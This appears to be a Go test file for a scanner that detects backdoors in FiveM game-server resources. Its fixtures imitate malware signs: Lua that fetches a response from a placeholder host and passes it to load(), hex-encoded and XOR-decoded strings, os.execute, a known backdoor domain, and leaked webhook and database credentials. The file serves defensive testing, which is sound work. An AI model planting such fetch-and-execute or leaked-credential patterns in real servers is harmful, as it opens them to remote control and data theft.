package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The fixtures below only imitate what backdoors look like. URLs point at
// example.invalid and nothing is ever called.

func hexEsc(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		fmt.Fprintf(&b, `\x%02x`, s[i])
	}
	return b.String()
}

func writeTree(t *testing.T, files map[string]string) string {
	t.Helper()
	root := t.TempDir()
	for name, body := range files {
		p := filepath.Join(root, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return root
}

func infectedTree(t *testing.T) string {
	return writeTree(t, map[string]string{
		"server.cfg": "endpoint_add_tcp \"0.0.0.0:30120\"\n" +
			"# rcon_password \"old\"\n" +
			"rcon_password \"hunter2\"\n" +
			"add_ace builtin.everyone command allow\n",

		"resources/bad/fxmanifest.lua": "fx_version 'cerulean'\ngame 'gta5'\n" +
			"server_scripts { 'server.lua', 'encoded.lua', 'ioc.lua', 'shell.lua', 'lib/.sync.js', 'jest_mock.js' }\n" +
			"client_script 'client.lua'\n" +
			"ui_page 'html/index.html'\n" +
			"files { 'html/**' }\n" +
			"--[[ 'server/real.js' ]]" + strings.Repeat(" ", 40) + "'server/.cache.js'\n",
		"resources/bad/server.lua": "PerformHttpRequest('https://example.invalid/x', function(code, body)\n" +
			"    local fn = load(body)\nend)\n",
		"resources/bad/encoded.lua": "local u = \"" + hexEsc("https://example.invalid/fxsweep-test-string") + "\"\n" +
			"local f = load(string.char(112, 114, 105, 110, 116))\n",
		"resources/bad/ioc.lua":   "local host = 'cipher-panel.me'\n",
		"resources/bad/shell.lua": "os.execute('echo test')\n",
		"resources/bad/jest_mock.js": "var a = [1, 2, 3], k = 7, s = '';\n" +
			"for (var i = 0; i < a.length; i++) s += String.fromCharCode(a[i]^k);\n",
		"resources/bad/client.lua":      "local hook = 'https://discord.com/api/webhooks/123456789012345678/not-a-real-token'\n",
		"resources/bad/html/index.html": "<script>const db = 'mysql://root:secret@localhost/game'</script>\n",

		"monitor/resource/sv_main.lua": "local RESOURCE_EXCLUDE = {}\n",
		"txData/admins.json":           `[{"name": "JohnsUrUncle"}]`,
	})
}

func cleanTree(t *testing.T) string {
	return writeTree(t, map[string]string{
		"server.cfg": "rcon_password \"\"\nadd_ace group.admin command allow\n",
		"resources/good/fxmanifest.lua": "fx_version 'cerulean'\ngame 'gta5'\n" +
			"server_script 'server.lua'\nclient_script 'client.lua'\n",
		// A webhook on the server side is normal, players never see it.
		"resources/good/server.lua": "local players = {}\n" +
			"local function load(id) players[id] = true end\n" +
			"PerformHttpRequest('https://discord.com/api/webhooks/1/abc', function() end, 'POST', '{}')\n" +
			"load(1)\n" +
			"local cfg = json.decode(LoadResourceFile(GetCurrentResourceName(), 'data.json'))\n",
		"resources/good/client.lua": "RegisterCommand('hi', function() print('hi') end)\n",
	})
}

func mustScan(t *testing.T, root string) *report {
	t.Helper()
	inds, err := loadIndicators("")
	if err != nil {
		t.Fatal(err)
	}
	r, err := scan(root, scanOptions{indicators: inds})
	if err != nil {
		t.Fatal(err)
	}
	return r
}

func has(r *report, rule, file string, sev severity) bool {
	for _, f := range r.Findings {
		if f.Rule == rule && f.File == file && f.Severity == sev {
			return true
		}
	}
	return false
}

func TestScanFindsBackdoors(t *testing.T) {
	r := mustScan(t, infectedTree(t))
	want := []struct {
		rule, file string
		sev        severity
	}{
		{"FX001", "resources/bad/ioc.lua", high},
		{"FX002", "resources/bad/server.lua", high},
		{"FX003", "resources/bad/jest_mock.js", high},
		{"FX004", "resources/bad/encoded.lua", high},
		{"FX006", "resources/bad/shell.lua", medium},
		{"FX007", "monitor/resource/sv_main.lua", high},
		{"FX007", "txData/admins.json", high},
		{"FX008", "resources/bad/encoded.lua", high},
		{"FX010", "resources/bad/fxmanifest.lua", high},
		{"FX012", "resources/bad/jest_mock.js", high},
		{"FX020", "resources/bad/client.lua", high},
		{"FX021", "resources/bad/html/index.html", high},
		{"FX030", "server.cfg", medium},
		{"FX031", "server.cfg", high},
	}
	for _, w := range want {
		if !has(r, w.rule, w.file, w.sev) {
			t.Errorf("missing %s %s in %s", w.sev, w.rule, w.file)
		}
	}
	if r.Resources != 1 {
		t.Errorf("resources = %d, want 1", r.Resources)
	}
	if t.Failed() {
		for _, f := range r.Findings {
			t.Logf("%+v", f)
		}
	}
}

func TestManifestDotFileAndDecoy(t *testing.T) {
	r := mustScan(t, infectedTree(t))
	var dot, decoy bool
	for _, f := range r.Findings {
		if f.Rule != "FX010" {
			continue
		}
		dot = dot || strings.Contains(f.Detail, ".sync.js")
		decoy = decoy || strings.Contains(f.Detail, "server/.cache.js")
	}
	if !dot || !decoy {
		t.Errorf("dot file entry found: %v, padded decoy found: %v", dot, decoy)
	}
}

func TestScanCleanServer(t *testing.T) {
	r := mustScan(t, cleanTree(t))
	for _, f := range r.Findings {
		t.Errorf("unexpected finding: %+v", f)
	}
}

func TestCacheFolderSkipped(t *testing.T) {
	root := writeTree(t, map[string]string{
		"cache/files/bad/server.lua":     "local host = 'cipher-panel.me'\n",
		"txData/base/cache/files/a.lua":  "local host = 'cipher-panel.me'\n",
		"txData/base/resources/y/b.lua":  "local x = 1\n",
		"resources/x/cache/server.lua":   "local host = 'cipher-panel.me'\n",
		"resources/x/fxmanifest.lua":     "fx_version 'cerulean'\n",
		"resources/x/.git/hooks/pre.lua": "local host = 'cipher-panel.me'\n",
	})
	r := mustScan(t, root)
	if len(r.Findings) != 1 || r.Findings[0].File != "resources/x/cache/server.lua" {
		t.Fatalf("findings = %+v", r.Findings)
	}
}

func TestBinaryAndOversizedFilesSkipped(t *testing.T) {
	root := writeTree(t, map[string]string{
		"a.lua": "cipher-panel.me\x00\x01",
		"b.lua": "cipher-panel.me" + strings.Repeat(" ", maxFileSize),
	})
	if r := mustScan(t, root); len(r.Findings) != 0 {
		t.Fatalf("findings = %+v", r.Findings)
	}
}

func TestQuarantine(t *testing.T) {
	root := infectedTree(t)
	qdir := filepath.Join(t.TempDir(), "q")
	r := mustScan(t, root)
	moved, err := quarantine(r, qdir)
	if err != nil {
		t.Fatal(err)
	}
	for _, rel := range []string{"resources/bad/server.lua", "resources/bad/ioc.lua", "resources/bad/jest_mock.js"} {
		if _, err := os.Stat(filepath.Join(root, rel)); !os.IsNotExist(err) {
			t.Errorf("%s still in place", rel)
		}
		if _, err := os.Stat(filepath.Join(qdir, rel)); err != nil {
			t.Errorf("%s not in quarantine: %v", rel, err)
		}
	}
	// Leaks and config problems are reported, never moved.
	for _, rel := range []string{"resources/bad/client.lua", "server.cfg", "resources/bad/fxmanifest.lua", "txData/admins.json"} {
		if _, err := os.Stat(filepath.Join(root, rel)); err != nil {
			t.Errorf("%s was moved", rel)
		}
	}
	log, err := os.ReadFile(filepath.Join(qdir, "fxsweep-quarantine.txt"))
	if err != nil {
		t.Fatal(err)
	}
	if n := strings.Count(string(log), "\n"); n != len(moved) {
		t.Errorf("log has %d lines for %d moved files", n, len(moved))
	}
}

func TestRunExitCodes(t *testing.T) {
	var out, errb bytes.Buffer
	if code := run([]string{"-lang", "en", "-no-color", infectedTree(t)}, &out, &errb); code != 1 {
		t.Errorf("infected: exit %d, stderr %s", code, errb.String())
	}
	if !strings.Contains(out.String(), "FX002") {
		t.Errorf("text report missing FX002:\n%s", out.String())
	}
	out.Reset()
	if code := run([]string{"-lang", "en", "-no-color", cleanTree(t)}, &out, &errb); code != 0 {
		t.Errorf("clean: exit %d", code)
	}
	if !strings.Contains(out.String(), "no backdoor indicators found") {
		t.Errorf("clean report:\n%s", out.String())
	}
	if code := run([]string{filepath.Join(t.TempDir(), "missing")}, &out, &errb); code != 2 {
		t.Errorf("missing dir: exit %d", code)
	}
	if code := run([]string{"-min", "extreme", "."}, &out, &errb); code != 2 {
		t.Errorf("bad -min: exit %d", code)
	}
}

func TestRunJSONAndMin(t *testing.T) {
	var out, errb bytes.Buffer
	code := run([]string{"-lang", "en", "-json", "-min", "high", infectedTree(t)}, &out, &errb)
	if code != 1 {
		t.Fatalf("exit %d", code)
	}
	var got struct {
		Version  string
		Findings []struct{ Rule, Severity string }
	}
	if err := json.Unmarshal(out.Bytes(), &got); err != nil {
		t.Fatalf("%v\n%s", err, out.String())
	}
	if len(got.Findings) == 0 {
		t.Fatal("no findings in JSON")
	}
	for _, f := range got.Findings {
		if f.Severity != "high" {
			t.Errorf("-min high let through %s %s", f.Severity, f.Rule)
		}
	}
}

func TestExtraIndicators(t *testing.T) {
	root := writeTree(t, map[string]string{"a.lua": "local x = 'evil.example'\n"})
	ioc := filepath.Join(t.TempDir(), "ioc.txt")
	os.WriteFile(ioc, []byte("# mine\nmyfamily evil.example\n"), 0o644)
	var out, errb bytes.Buffer
	if code := run([]string{"-lang", "en", "-no-color", "-ioc", ioc, root}, &out, &errb); code != 1 {
		t.Fatalf("exit %d\n%s%s", code, out.String(), errb.String())
	}
	if !strings.Contains(out.String(), "myfamily: evil.example") {
		t.Errorf("custom indicator not reported:\n%s", out.String())
	}
}

func TestReportExplainsFindings(t *testing.T) {
	root := infectedTree(t)
	var out, errb bytes.Buffer
	run([]string{"-lang", "en", "-no-color", root}, &out, &errb)
	s := out.String()
	for _, want := range []string{
		en.rules["FX002"].title,
		"Downloads code from the internet",
		"What to do: Delete this resource",
		en.serverFiles,
		en.nextSteps,
		"1. Stop the server.",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("English report missing %q", want)
		}
	}

	out.Reset()
	run([]string{"-lang", "tr", "-no-color", root}, &out, &errb)
	s = out.String()
	for _, want := range []string{"YÜKSEK", tr.rules["FX020"].title, "Ne yapmalı:", tr.nextSteps, "1. Sunucuyu kapat."} {
		if !strings.Contains(s, want) {
			t.Errorf("Turkish report missing %q", want)
		}
	}

	if code := run([]string{"-lang", "de", root}, &out, &errb); code != 2 {
		t.Errorf("unknown language: exit %d", code)
	}
}

func TestEveryRuleIsTranslated(t *testing.T) {
	for id := range rules {
		for name, c := range messages {
			if r := c.rules[id]; r.title == "" || r.why == "" || r.fix == "" {
				t.Errorf("%s: %s text missing", name, id)
			}
		}
	}
}

func TestWrap(t *testing.T) {
	got := wrap("bir iki üç dört beş", 8)
	want := []string{"bir iki", "üç dört", "beş"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Errorf("wrap = %q", got)
	}
}
